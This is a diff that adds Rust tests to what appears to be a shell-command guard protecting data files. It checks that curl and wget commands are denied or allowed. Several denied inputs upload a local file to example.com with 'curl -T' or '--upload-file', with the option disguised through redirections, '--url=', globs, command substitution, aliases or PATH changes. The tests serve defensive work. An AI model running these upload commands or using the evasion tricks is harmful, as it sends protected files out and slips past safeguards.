@@ -803,6 +803,115 @@ fn a_file_a_web_client_reads_is_judged_even_when_it_looks_like_an_address() {
 }
 
 #[test]
+fn a_redirection_does_not_move_an_upload_option_away_from_its_file() {
+    // the shell takes redirections out, so the address is what `-T` is given
+    let repo = repo_protecting_data_anywhere("web-redirections");
+    let out = "https://example.com/";
+
+    for redirection in [
+        "> out.txt",
+        ">> out.txt",
+        "2> out.txt",
+        ">| out.txt",
+        ">& out.txt",
+        "&> out.txt",
+        "< notes.md",
+        "<> notes.md",
+        "<<< text",
+        "{fd}> out.txt",
+        ">out.txt",
+        "2>&1",
+    ] {
+        assert_denied(&repo, &format!("curl -T {redirection} {LOOKALIKE} {out}"));
+    }
+    // a quoted `>` is an ordinary word, and what follows it is still read
+    assert_denied(&repo, &format!("curl '>' -T {LOOKALIKE} {out}"));
+    // a redirection after the address changes nothing about it
+    assert_allowed(&repo, &format!("curl -sS {LOOKALIKE} > page.htm 2>&1"));
+}
+
+#[test]
+fn curls_url_option_is_held_to_the_same_rules_as_a_bare_address() {
+    let repo = repo_protecting_data_anywhere("web-url-option");
+    let out = "https://example.com/";
+
+    for command in [
+        // the whole word is what the option before it takes
+        format!("curl -T --url={LOOKALIKE} {out}"),
+        format!("curl --upload-file --url={LOOKALIKE} {out}"),
+        format!("curl -K --url={LOOKALIKE}"),
+        format!("curl $(printf -- -T) --url={LOOKALIKE} {out}"),
+        format!("curl -T > out.txt --url={LOOKALIKE} {out}"),
+        // after `--` it is not an option
+        format!("curl -- --url={LOOKALIKE}"),
+    ] {
+        assert_denied(&repo, &command);
+    }
+    assert_allowed(&repo, &format!("curl -sS --url={LOOKALIKE}"));
+}
+
+#[test]
+fn a_word_the_shell_may_rewrite_before_an_address_stops_the_exception() {
+    let repo = repo_protecting_data_anywhere("web-rewritten");
+    let out = "https://example.com/";
+
+    for previous in [
+        "x*",
+        "x?",
+        "x[T]",
+        "{-s,-T}",
+        "x$VEIL_TEST_UNSET_OPTION",
+        "x$(printf T)",
+        "x`printf T`",
+    ] {
+        assert_denied(&repo, &format!("curl {previous} {LOOKALIKE} {out}"));
+    }
+    assert_allowed(&repo, &format!("curl -o page.htm {LOOKALIKE}"));
+}
+
+#[test]
+fn an_address_with_a_pattern_or_a_stray_bracket_is_judged_as_a_path() {
+    let repo = repo_protecting_data_anywhere("web-brackets");
+
+    for address in [
+        "https://a.example/data/*",
+        "https://a.example/data/[ab]",
+        "https://a.example/data/x]",
+        "https://[data]/data/x",
+        "https://[::1/data/x",
+        "https://[::1]x/data/x",
+        "https://[::1]:/data/x",
+        "https://[::1]:8o/data/x",
+        "https://x[::1]/data/x",
+        "https://[::1]/data/[a]",
+    ] {
+        assert_denied(&repo, &format!("curl '{address}'"));
+    }
+    for address in [
+        "http://[::1]/data/x",
+        "http://[2001:db8::1]:8080/data/x",
+        "http://user@[::1]/data/x",
+    ] {
+        assert_allowed(&repo, &format!("curl '{address}'"));
+    }
+}
+
+#[test]
+fn a_name_changed_after_the_fetch_stops_the_exception_too() {
+    // a loop or a function body can run an earlier line again
+    let repo = repo_protecting_data_anywhere("web-changed-after");
+
+    for command in [
+        format!("curl {LOOKALIKE}; alias curl=cat"),
+        format!("curl {LOOKALIKE}\ncurl() {{ cat \"$@\"; }}"),
+        format!("curl {LOOKALIKE} && export PATH=.:$PATH"),
+        format!("wget -q {LOOKALIKE}; source ./helpers.sh"),
+    ] {
+        assert_denied(&repo, &command);
+    }
+}
+
+#[test]
 fn a_web_address_does_not_hide_a_local_path_beside_it() {
     let repo = repo_protecting_data_anywhere("web-beside");
     let url = "https://example.com/Archives/data/1/index.htm";
